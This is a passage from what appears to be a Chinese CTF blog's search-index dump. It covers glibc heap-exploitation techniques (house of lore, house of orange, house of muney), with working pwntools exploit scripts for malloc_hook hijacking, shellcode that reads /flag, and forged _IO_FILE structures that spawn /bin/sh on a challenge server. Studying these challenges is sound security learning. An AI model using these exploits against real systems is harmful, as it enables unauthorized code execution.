libc.sym[&quot;__libc_realloc&quot;]offset = malloc_hook - topsystem = libc.sym[&#x27;system&#x27;]bin_sh = libc.search(b&#x27;/bin/sh&#x27;)success(&quot;system:&quot; + hex(system))success(&quot;bin_sh:&quot; + str(bin_sh))#debug()#one_gadget + libc.address -&gt; 计算偏移,使topchunk落在malloc_hook处#此时申请一个chunk，就可以实现修改malloc_hook和realloc_hookadd(offset-0x30,b&#x27;aaa\\n&#x27;)add(0x30,b&#x27;a&#x27;*8+p64(one_gadget[1] + libc.address)+p64(realloc+0x10))#hijack_malloc_hook#再次执行malloc，即可getshellp.recvuntil(&quot;2:puts\\n&quot;)p.sendline(&#x27;1&#x27;)p.recvuntil(&quot;size\\n&quot;)p.sendline(str(20))p.interactive()\n\n","categories":["heap"],"tags":["bin"]},{"title":"house_of_lore","url":"/2023/11/03/house-of-lore/","content":"unsorted bin + small bin还有largebin版本的利用比较类似\n贴一波smallbin的源码\n/*       If a small request, check regular bin.  Since these &quot;smallbins&quot;       hold one size each, no searching within bins is necessary.       (For a large request, we need to wait until unsorted chunks are       processed to find best fit. But for small ones, fits are exact       anyway, so we can check now, which is faster.)     */    if (in_smallbin_range(nb)) &#123;        // 获取 small bin 的索引        idx = smallbin_index(nb);        // 获取对应 small bin 中的 chunk 指针        bin = bin_at(av, idx);        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk        // 如果 victim = bin ，那说明该 bin 为空。        // 如果不相等，那么会有两种情况        if ((victim = last(bin)) != bin) &#123;            // 第一种情况，small bin 还没有初始化。            if (victim == 0) /* initialization check */                // 执行初始化，将 fast bins 中的 chunk 进行合并                malloc_consolidate(av);            // 第二种情况，small bin 中存在空闲的 chunk            else &#123;                // 获取 small bin 中倒数第二个 chunk 。                bck = victim-&gt;bk;                // 检查 bck-&gt;fd 是不是 victim，防止伪造                if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;                    errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                    goto errout;                &#125;                // 设置 victim 对应的 inuse 位                set_inuse_bit_at_offset(victim, nb);                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来                bin-&gt;bk = bck;                bck-&gt;fd = bin;                // 如果不是 main_arena，设置对应的标志                if (av != &amp;main_arena) set_non_main_arena(victim);                // 细致的检查                check_malloced_chunk(av, victim, nb);                // 将申请到的 chunk 转化为对应的 mem 状态                void *p = chunk2mem(victim);                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff                alloc_perturb(p, bytes);                return p;            &#125;        &#125;    &#125;\n这段程序来自how2heap的house_of_lore,(glibc-2.27 version)展示了unsortedbin的house of lore\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; \tfprintf(stderr, &quot;Nice jump d00d\\n&quot;); \texit(0); &#125;int main(int argc, char * argv[])&#123;   intptr_t *victim = malloc(0x100);  void *dummies[7];  for(int i=0; i&lt;7; i++) dummies[i] = malloc(0x100);//先填满tache   // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk  intptr_t *victim_chunk = victim-2;  intptr_t* stack_buffer_1[4] = &#123;0&#125;;  intptr_t* stack_buffer_2[4] = &#123;0&#125;;  void* fake_freelist[7][4];  for(int i=0; i&lt;6; i++) &#123;    fake_freelist[i][3] = fake_freelist[i+1];  &#125;  fake_freelist[6][3] = NULL;//在栈上伪造一段fake_free_list，来骗    stack_buffer_1[0] = 0;  stack_buffer_1[1] = 0;  stack_buffer_1[2] = victim_chunk;//绕过smallbin的检查   stack_buffer_1[3] = (intptr_t*)stack_buffer_2;//绕过smallbin检查   stack_buffer_2[2] = (intptr_t*)stack_buffer_1;  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];//防止crash     void *p5 = malloc(1000);//防止合并   for(int i=0; i&lt;7; i++) free(dummies[i]);  free((void*)victim);//free进unsortedbin   fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);//此时根据首个unsortedbin的特性，该chunk的fd和bk指针将会指向libc   void *p2 = malloc(1200);//申请一个smallbin和unsortedbin的都无法满足其大小的堆块   //此时，我们原本的申请的victim就会被插入到smallbin的前面   //而且它的fd和bk更新      fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  //------------VULNERABILITY-----------  //模拟UAF篡改victim的过程   victim[1] = (intptr_t)stack_buffer_1;   //------------------------------------  for(int i=0; i&lt;7; i++) malloc(0x100);//清空tache   void *p3 = malloc(0x100);//来骗！  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;);  char *p4 = malloc(0x100);// 来偷袭！ chunk2stack   fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;,stack_buffer_2[2]);  fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4);   intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode  //  long offset = (long)__builtin_frame_address(0) - (long)p4;  memcpy((p4+offset+8), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary  // sanity check  assert((long)__builtin_return_address(0) == (long)jackpot);&#125;\n\n写了个小文件,几乎啥漏洞都能打（\n//gcc lore.c -g  -o lore //gcc 2heap.c -g -no-pie -no-stack-protector -o heap2stack #include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123;    puts(&quot;what u want to do next?&quot;);    puts(&quot;1. Build a house&quot;);\tputs(&quot;2. Delete a house&quot;);\tputs(&quot;3. Edit your house&quot;);\tputs(&quot;4. Show your house&quot;);    puts(&quot;5. Exit&quot;);    puts(&quot;6. Magic&quot;);    puts(&quot;&gt;&quot;);&#125;void add()&#123;    char size[20];    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;You have built %d houses in my world\\n&quot;,chunk_time);        puts(&quot;You can customize the size of house here, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);\t\tchunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]);\t\tputs(&quot;add something to your house&quot;);        read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;something wrong,but you can come in any time&quot;);            exit(0);        &#125;    &#125;else&#123;                puts(&quot;something wrong,but you can come in any time&quot;);        exit(0);    &#125;&#125;void delete()&#123;    int index;    puts(&quot;I won&#x27;t set the pointer to zero&quot;);    puts(&quot;every decision you made is meaningful&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(chunk_ptr[index]);&#125;void edit()&#123;    int index;    puts(&quot;something wrong?&quot;);    puts(&quot;It&#x27;s never too late to make changes&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;something interesting here&quot;);    read(0,&amp;chunk_size[index],0x8);    puts(&quot;Nice choice!&quot;);    puts(&quot;Now add something&quot;);    read(0,chunk_ptr[index],chunk_size[index]);    puts(&quot;ok\\n&quot;);&#125;void show()&#123;    puts(&quot;Nothing is perfect,but you can make something different&quot;);    puts(&quot;Let&#x27;s see what you can do&quot;);    int index;    scanf(&quot;%d&quot;,&amp;index);    puts(chunk_ptr[index]);&#125;int main()&#123;    int choice;    init();    puts(&quot;This program is used to explore something about&quot;);    puts(&quot;\t **  ** ******    **    ******  **&quot;);\tputs(&quot;\t**__** **__     ****   **__**  **&quot;);\tputs(&quot; **  ** **      **__**  *****   **&quot;);\tputs(&quot;**  ** ****** ******** **      __&quot;);    puts(&quot;written by str1k3&quot;);    puts(&quot;input you passwd:&quot;);    mmap((void*)0xACE00000,0x1200ull,7,33,-1,0ll);    read(0,(void*)0xACE00000,0x233);    puts(&quot;Welcome to my world!&quot;);    puts(&quot;In my world,you can build up some houses&quot;);    mmap((void*)0xbad00000,0x120ull,7,33,-1,0ll);    while(1)&#123;        menu();        scanf(&quot;%d&quot;,&amp;choice);        switch(choice)&#123;            case 1:                add();                break;            case 2:                delete();                break;            case 3:                edit();                break;            case 4:                show();                break;            case 5:                puts(&quot;ready to exit?&quot;);                puts(&quot;back to your life!&quot;);                exit(0);                break;            case 6:                puts(&quot;Use your force! CTFer&quot;);                read(0,(void*)0xbad00000,0x66);        &#125;    &#125;&#125;\n\n┌──(str1d3r㉿str1k3Gwindows)-[~/桌面/Desktop]└─$ checksec lore[*] &#x27;/mnt/Desktop/lore&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\nfrom pwn import*from pwn import p64,u64p = process(&quot;./lore&quot;)elf = ELF(&quot;./lore&quot;)#libc = ELF(&quot;./libc-2.27.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(magic,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;say a magic word before your build&quot;)    p.sendline(str(magic))    p.recvuntil(b&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;add something to your house\\n&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;every decision you made is meaningful&#x27;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;It&#x27;s never too late to make changes&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;something interesting here&quot;)    p.sendline(str(size))    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))def exit():    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;5&#x27;)def magic(magic):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;6&#x27;)    p.recvuntil(b&quot;Use your force! CTFer&quot;)    p.sendline(str(magic))orw = b&quot;\\x90&quot; * 0x100orw  += asm(shellcraft.open(&quot;/flag&quot;))orw  += asm(shellcraft.read(3, 0xACE00500, 0x500))orw  += asm(shellcraft.write(1, 0xACE00500, 0x500))orw_addr = 0xACE00500stack_buffer_addr = 0xbad00000p.recvuntil(b&#x27;passwd:&#x27;)p.sendline(orw)add(0x100,b&#x27;aaaa&#x27;)#victimadd(0x100,b&#x27;aaaa&#x27;)delete(0)delete(1)show(1)victim =u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))success(&quot;chunk0_addr:%s&quot;,hex(victim))#stack_buffer_1-&gt;fd=stack_buffer_1[2]=victimstack_buff = p64(0) +p64(0x500)stack_buff += p64(stack_buffer_addr)stack_buff +=p64(victim)magic(stack_buff)add(0x100,b&#x27;aaaa&#x27;)#victimfor i in range(7):    add(0x100,b&#x27;bbbb&#x27;)#tcacheadd(1000,b&#x27;cccc&#x27;)for i in range(7):    delete(i+1)add(1200,b&#x27;dddd&#x27;)delete(0)edit(0,0x100,p64(0)+p64(stack_buffer_addr))for i in range(7):    add(0x100,b&#x27;aaaa&#x27;)#tcacheadd(0x100,b&#x27;aaaa&#x27;)add(0x100,p64(0)+p64(orw_addr))\n\n\n","categories":["heap"],"tags":["bin"]},{"title":"house_of_orange","url":"/2023/10/01/house-of-orange/","content":"house of orange\n我们在打House of Force中使用的方法是修改Top_chunk为一个特别大的值来拿捏Top_chunk，之后申请一个特别大的chunk，循环一遍内存之后就可以访问到原本Top_chunk上方的内容\n那如果将Top_chunk修改为一个很小的值呢？\nmalloc分配内存的时候实际上更底层是通过sbrk的调用拓展内存的空间的假如我们把Top_chunk修改为一个很小的数，这时再申请一个更大的chunk内存认为的Top_chunk是无法满足申请空间的需求的，因此堆管理器后续会再使用brk申请一块新的区域\n正常来说堆管理器会直接将通过brk分配的新内存直接并入到Top_chunk中（即让Top_chunk变大）但是由于我们改小了Top_chunk，堆管理器认为Top_chunk与堆的尾部并不相邻\n因此会将原本的Top_chunk Free掉\n这样一番过程下来，我们就没有通过Free函数得到了一个Free chunk根据修改的Top Chunk大小，我们可以利用这个Free Chunk来实现Unsorted bin attack\n利用Unsorted bin attack结合伪造IO_file就可以劫持程序执行流\n需要伪造的是这段,目标是触发_overflow函数\npwndbg&gt; dt FILEFILE    +0x0000 _flags               : int    +0x0008 _IO_read_ptr         : char *    +0x0010 _IO_read_end         : char *    +0x0018 _IO_read_base        : char *    +0x0020 _IO_write_base       : char *    +0x0028 _IO_write_ptr        : char *    +0x0030 _IO_write_end        : char *    +0x0038 _IO_buf_base         : char *    +0x0040 _IO_buf_end          : char *    +0x0048 _IO_save_base        : char *    +0x0050 _IO_backup_base      : char *    +0x0058 _IO_save_end         : char *    +0x0060 _markers             : struct _IO_marker *    +0x0068 _chain               : struct _IO_FILE *    +0x0070 _fileno              : int    +0x0074 _flags2              : int    +0x0078 _old_offset          : __off_t    +0x0080 _cur_column          : short unsigned int    +0x0082 _vtable_offset       : signed char    +0x0083 _shortbuf            : char [1]    +0x0088 _lock                : _IO_lock_t *    +0x0090 _offset              : __off64_t    +0x0098 _codecvt             : struct _IO_codecvt *    +0x00a0 _wide_data           : struct _IO_wide_data *    +0x00a8 _freeres_list        : struct _IO_FILE *    +0x00b0 _freeres_buf         : void *    +0x00b8 __pad5               : size_t    +0x00c0 _mode                : int    +0x00c4 _unused2             : char [20]\npwndbg&gt; p *_IO_list_all$1 = &#123;  file = &#123;    _flags = -72540025,     _IO_read_ptr = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_read_end = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_read_base = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_write_base = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_write_ptr = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_write_end = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_buf_base = 0x7f0b81d6d703 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,     _IO_buf_end = 0x7f0b81d6d704 &lt;_IO_2_1_stderr_+132&gt; &quot;&quot;,     _IO_save_base = 0x0,     _IO_backup_base = 0x0,     _IO_save_end = 0x0,     _markers = 0x0,     _chain = 0x7f0b81d6d760 &lt;_IO_2_1_stdout_&gt;,     _fileno = 2,     _flags2 = 0,     _old_offset = -1,     _cur_column = 0,     _vtable_offset = 0 &#x27;\\000&#x27;,     _shortbuf = &quot;&quot;,     _lock = 0x7f0b81d6e8b0 &lt;_IO_stdfile_2_lock&gt;,     _offset = -1,     _codecvt = 0x0,     _wide_data = 0x7f0b81d6c780 &lt;_IO_wide_data_2&gt;,     _freeres_list = 0x0,     _freeres_buf = 0x0,     __pad5 = 0,     _mode = 0,     _unused2 = &#x27;\\000&#x27; &lt;repeats 19 times&gt;  &#125;,   vtable = 0x7f0b81d692a0 &lt;_IO_file_jumps&gt;&#125;\n还是放段源码吧\nstruct _IO_FILE &#123;int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags   /* The following pointers correspond to the C++ streambuf protocol. */  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */  char* _IO_read_ptr;   /* Current read pointer */  char* _IO_read_end;   /* End of get area. */  char* _IO_read_base;  /* Start of putback+get area. */  char* _IO_write_base; /* Start of put area. */  char* _IO_write_ptr;  /* Current put pointer. */  char* _IO_write_end;  /* End of put area. */  char* _IO_buf_base;   /* Start of reserve area. */  char* _IO_buf_end;    /* End of reserve area. */  /* The following fields are used to support backing up and undo. */  char *_IO_save_base; /* Pointer to start of non-current get area. */  char *_IO_backup_base;  /* Pointer to first valid character of backup area */  char *_IO_save_end; /* Pointer to end of non-current get area. */   struct _IO_marker *_markers;   struct _IO_FILE *_chain;   int _fileno;#if 0  int _blksize;#else  int _flags2;#endif  _IO_off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */ #define __HAVE_COLUMN /* temporary */  /* 1+column number of pbase(); 0 is unknown. */  unsigned short _cur_column;  signed char _vtable_offset;  char _shortbuf[1]; /*  char* _save_gptr;  char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;;\n可以按照如下伪造\n#house of orange#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  fake_file = b&#x27;/bin/sh\\x00&#x27; #flags,也是最后__overflow调用的参数fake_file += p64(0x61)     #size为0x61，被放入small_bin，从而对应了chain指针fake_file += p64(0) + p64(io_list_all - 0x10)#unsorted bin attack，修改_IO_list_all为main_arena+88fake_file += p64(0) + p64(1)  #_IO_write_base &lt; _IO_write_ptrfake_file += b&#x27;\\x00&#x27;*0x90     #填充中间(从_IO_write_end后到_mode)（对利用）无用的数据fake_file += p64(0)       #_mode &lt;= 0fake_file += b&#x27;\\x00&#x27;*0x10 #_unused2 fake_file += p64(heap_base + 0x120)   #the offset byte of vtablefake_file += p64(0)*3 fake_file += p64(system)#__overflow payload = b&#x27;a&#x27;*0x10 payload += fake_file\n注意该攻击手段仅适用于2.23及2.23以前,但是其在无free的情况下造成free的手段可以使用来看个例题吧[SWPUCTF 2021 新生赛]NSS_printer_IIchecksec\n└─$ checksec printer[*] &#x27;/mnt/Desktop/printer&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nmain函数内存在一次base编码，具体不赘述存在格式化字符串漏洞，可以泄露libc和heap只有增，删改查都没有\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  int v3; // [rsp+8h] [rbp-E8h]  unsigned int size; // [rsp+Ch] [rbp-E4h]  char *format; // [rsp+18h] [rbp-D8h]  char s1[32]; // [rsp+20h] [rbp-D0h] BYREF  char v7[32]; // [rsp+40h] [rbp-B0h] BYREF  char v8[136]; // [rsp+60h] [rbp-90h] BYREF  unsigned __int64 v9; // [rsp+E8h] [rbp-8h]  v9 = __readfsqword(0x28u);  init(argc, argv, envp);  v3 = 0;  while ( 1 )  &#123;    do    &#123;      printf(&quot;username = &quot;);      gets(s1);      printf(&quot;password = &quot;);      gets(v7);      ++v3;      base64_encode(v7, (__int64)v8);    &#125;    while ( strcmp(s1, &quot;NSSCTF&quot;) );    if ( !strcmp(v8, &quot;Z=FZJhKU5jPQ3jC65I86F0Kb&quot;) )    &#123;      puts(&quot;Hello, welcome to NSS printer&quot;);      while ( 1 )      &#123;        printf(&quot;lens of your word: &quot;);        size = read_num();        if ( size &gt; 0x1000 )          break;        format = (char *)malloc(size);        printf(&quot;input what you want to say: &quot;);        gets(format);        printf(&quot;you said: &quot;);        printf(format);        putchar(10);      &#125;      puts(&quot;too long&quot;);      exit(1);    &#125;  &#125;&#125;\n难点就是如何在没有free的情况下free掉一个chunk，使其进入unsortedbin，以完成稍后的利用\nfrom pwn import *from LibcSearcher import*from ctypes import *from struct import packcontext(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()#p = process([&quot;./printer&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 29000)p.sendlineafter(&quot;username = &quot;, &quot;NSSCTF\\x00&quot;)p.sendlineafter(&quot;password = &quot;, &quot;NSSCTF&#123;b@se_xx_64&#125;\\x00&quot;)def attack(size, content):    p.sendlineafter(&quot;word: &quot;, str(size))    p.sendlineafter(&quot;say: &quot;, content)pl = b&#x27;%37$p.%33$p.%9$p&#x27; + p64(0) + p64(0xfe1)attack(0x10, pl)#fmtp.recvuntil(&#x27;0x&#x27;)libc_start_main_addr = int((p.recv(12)),16) - 240p.recvuntil(&#x27;0x&#x27;)pro_base = int((p.recv(12)),16) - 0xa10p.recvuntil(&#x27;0x&#x27;)heap_base = int((p.recv(12)),16) - 0x10libc = ELF(&#x27;./libc.so.6&#x27;) #2.23-0ubuntu11.3_amd64libc_base = libc_start_main_addr - libc.sym[&#x27;__libc_start_main&#x27;]system = libc_base + libc.sym[&#x27;system&#x27;]io_list_all = libc_base + libc.sym[&#x27;_IO_list_all&#x27;]success(&quot;libc:%s&quot;,hex(libc_base))success(&quot;system:%s&quot;,hex(system))success(&quot;heap_base:%s&quot;,hex(heap_base))#--------house of orange--------#debug()attack(0x1000, b&#x27;aaaaa&#x27;) #----- 修改Top Chunk得到一个Free chunk ##本地debug过不去，但是ida反编译和靶机环境都可以申请到0x1000的chunk#执行vtable的函数时，FILE结构体地址被作为参数，因此，我们在最开头写/bin/sh字符串  fake_file = b&#x27;/bin/sh\\x00&#x27; #flags,也是最后__overflow调用的参数fake_file += p64(0x61)  #size作为0x61，被放入small_bin，从而对应了chain指针fake_file += p64(0) + p64(io_list_all - 0x10)#unsorted bin attack，修改_IO_list_all为main_arena+88fake_file += p64(0) + p64(1)  #_IO_write_base &lt; _IO_write_ptrfake_file += b&#x27;\\x00&#x27;*0x90     #填充中间(从_IO_write_end后到_mode)（对利用）无用的数据fake_file += p64(0)       #_mode &lt;= 0fake_file += b&#x27;\\x00&#x27;*0x10 #_unused2 fake_file += p64(heap_base + 0x120)   #the offset byte of vtablefake_file += p64(0)*3 fake_file += p64(system)#__overflow payload = b&#x27;a&#x27;*0x10 payload += fake_fileattack(0x10, payload)p.sendlineafter(&quot;word: &quot;, str(0x10))p.interactive()\n报了一堆错，但是弹了一个shell需要多打几次\n[DEBUG] Received 0x4b bytes:    b&quot;*** Error in `./pwn5&#x27;: malloc(): memory corruption: 0x00007f3d936e6520 ***\\n&quot;*** Error in `./pwn5&#x27;: malloc(): memory corruption: 0x00007f3d936e6520 ***[DEBUG] Received 0x178 bytes:    b&#x27;======= Backtrace: =========\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f3d933987f5]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7f3d933a315e]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3d933a51d4]\\n&#x27;    b&#x27;./pwn5(+0xfc0)[0x55dc9c804fc0]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3d93341840]\\n&#x27;    b&#x27;./pwn5(+0xa39)[0x55dc9c804a39]\\n&#x27;    b&#x27;======= Memory map: ========\\n&#x27;======= Backtrace: =========/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f3d933987f5]/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7f3d933a315e]/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3d933a51d4]./pwn5(+0xfc0)[0x55dc9c804fc0]/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3d93341840]./pwn5(+0xa39)[0x55dc9c804a39]======= Memory map: ========$\n\n第一次复现如此巧妙的攻击手法，喵喵喵前面的例题，以后再来探索吧\n","categories":["heap"],"tags":["_IO_FILE"]},{"title":"house_of_muney","url":"/2024/05/17/house-of-muney/","content":"[前置][glibc源码调试]该手段需配合glibc的源码分析，先存一个glibc源码的调试配置\n具体glibc的编译可以参考前面的文，注意一下glibc-all-in-one下载的东西貌似不能直接用，可以在这里下载：https://ftp.gnu.org/gnu/glibc/\n可以按以下脚本启动，需要注意dir指定的目录\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;,endian=&quot;little&quot;)p = process([&quot;/home/str1k3/Desktop/glibc-2.31/glibc-2.31/build/elf/ld.so&quot;,&quot;./a.out&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.31.so&quot;&#125;)def debug(s=&#x27;&#x27;):    gdb.attach(p, s)    pause()cmd = &quot;&quot;&quot;dir /home/str1k3/Desktop/glibc-2.31/glibc-2.31/elf&quot;&quot;&quot;debug(cmd)p.interactive()\n效果如下\n[ELF]以简单的程序看看ELF文件的解析过程\n//gcc sys1.c -fno-pie -g -o sys1#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;char *buff;read(0,buff,0x15);//为了让程序长一点好下断点system(&quot;/bin/sh&quot;);return 0;&#125;\n组成 elf 文件的基本单位是 section，可以翻译为节。elf 头会定义节头表，节头表中定义了节的数量、每个节的类型、起始的虚拟地址。与动态链接相关的节为.dynamic 节，这里面存储这与动态链接相关的描述信息。这里的.dynamic节实际上是一个数组，其中的每一个元素都表示其对应的结构体：\ntypedef struct&#123;  Elf64_Sxword\td_tag;\t\t\t/* Dynamic entry type */  union    &#123;      Elf64_Xword d_val;\t\t/* Integer value */      Elf64_Addr d_ptr;\t\t\t/* Address value */    &#125; d_un;&#125; Elf64_Dyn;\ntag表示的是该元素（节）的类型，如readelf的结果中的\n0x0000000000000005 (STRTAB)             0x4004380x0000000000000006 (SYMTAB)             0x4003c0\n则这俩元素的类型分别为STRTAB和SYMTAB。而符号解析与STRTAB和SYMTAB相关。\nSTRTAB是字符串表，存储的是整个程序所需要用到的所有字符。SYMTAB则是符号表，其数据结构如下：\ntypedef struct&#123;  Elf64_Word\tst_name;\t\t/* Symbol name (string tbl index) */  unsigned char\tst_info;\t\t/* Symbol type and binding */  unsigned char st_other;\t\t/* Symbol visibility */  Elf64_Section\tst_shndx;\t\t/* Section index */  Elf64_Addr\tst_value;\t\t/* Symbol value */  Elf64_Xword\tst_size;\t\t/* Symbol size */&#125; Elf64_Sym;\nst_name表示这个符号所描述的字符串在字符串表中的下标。st_value表示符号的值。而当符号是一个函数或者变量的时候，这个值就代表符号的虚拟地址\n那么，我们如果能篡改st_name和st_value，就能将某一函数劫持为另一函数，造成代码执行\nSTRTAB和SYMTAB实现了符号的寻找，但是还需要用重定位表来描述那些符号需要重定位重定位表的数据结构为：\ntypedef struct&#123;  Elf64_Addr\tr_offset;\t\t/* Address */  Elf64_Xword\tr_info;\t\t\t/* Relocation type and symbol index */&#125; Elf64_Rel;\n一般在查找动态符号的时候，r_offset代表对应符号在 got 表中的地址,即我们平时使用的\nelf.got[&#x27;function&#x27;]\n拿到的地址r_info低 32 位表示重定位入口的类型，高 32 位表示这个重定位符号在符号表中的下标。\nplt表和got表的事儿在玩格式化字符串和ret2libc的时候就搞过了，基本上就是plt表跳转到got表，若是第一次调用该函数，则解析该函数的地址，填入到got表内，之后每次调用就直接使用真实地址进行跳转\n看一下第一次调用时执行的指令\npush npush ModuleIDjmp _dl_runtime_resolve\n这里的 n 对应的是该符号在 rel.plt 重定位表中的下标ModuleID一般是程序的linkmap结构体的地址接下来跳到_dl_runtime_resolve，看一手_dl_runtime_resolve_xsavec.先保护了一波现场，再call了dl_fixup，看看dl_fixup(dl-runtime.c,line 52)\n/* This function is called through a special trampoline from the PLT the first time each PLT entry is called.  We must perform the relocation specified in the PLT of the given shared object, and return the resolved function address to the trampoline, which will restart the original call to that address.Future calls will bounce directly from the PLT to the   function.  */DL_FIXUP_VALUE_TYPEattribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS\t   ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif\t   struct link_map *l, ElfW(Word) reloc_arg)&#123;  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  const ElfW(Sym) *refsym = sym;  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);   /* Look up the target symbol.  If the normal lookup rules are not      used don&#x27;t look in the global scope.  */  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    &#123;      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t&#123;\t  const ElfW(Half) *vernum =\t    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t  version = &amp;l-&gt;l_versions[ndx];\t  if (version-&gt;hash == 0)\t    version = NULL;\t&#125;      /* We need to keep the scope around so do some locking.  This is\t not necessary for objects which cannot be unloaded or when\t we are not using any threads (yet).  */      int flags = 